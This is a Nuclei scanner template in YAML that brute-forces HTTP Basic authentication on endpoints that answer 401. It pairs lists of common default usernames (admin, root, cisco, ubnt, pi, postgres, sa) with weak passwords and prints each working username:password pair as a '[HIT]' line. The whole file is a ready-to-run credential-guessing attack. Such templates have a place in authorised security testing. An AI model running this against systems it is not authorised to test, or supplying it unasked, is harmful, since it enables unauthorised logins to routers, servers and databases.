flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 401
    - contains(tolower(header), 'www-authenticate')
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
- attack: pitchfork
  extractors:
  - dsl:
    - '"[HIT] " + BaseURL + " | " + username + ":" + password'
    type: dsl
  headers:
    Authorization: Basic {{base64(username + ':' + password)}}
  matchers:
  - condition: and
    dsl:
    - status_code == 200 || status_code == 302
    - '!contains(tolower(header), ''www-authenticate'')'
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    password:
    - admin
    - admin123
    - demo
    - administrator
    - password
    - password123
    - 123123
    - 123123123
    - 123123123123
    - 123456
    - 12345678
    - 1234567890
    - 0987654321
    - 654321
    - qwerty
    - root
    - toor
    - guest
    - test
    - support
    - service
    - changeme
    - change_me
    - default
    - 1234
    - 0
    - ''
    - '{{username}}'
    username:
    - admin
    - administrator
    - root
    - user
    - demo
    - guest
    - test
    - support
    - operator
    - superadmin
    - sysadmin
    - service
    - manager
    - monitor
    - netadmin
    - cisco
    - ubnt
    - pi
    - oracle
    - postgres
    - sa
id: default-credentials-401-bruteforce
info:
  author: yourhandle
  name: Default Credentials Bruteforce (401 gate)
  severity: high
  tags: default-login,basic-auth
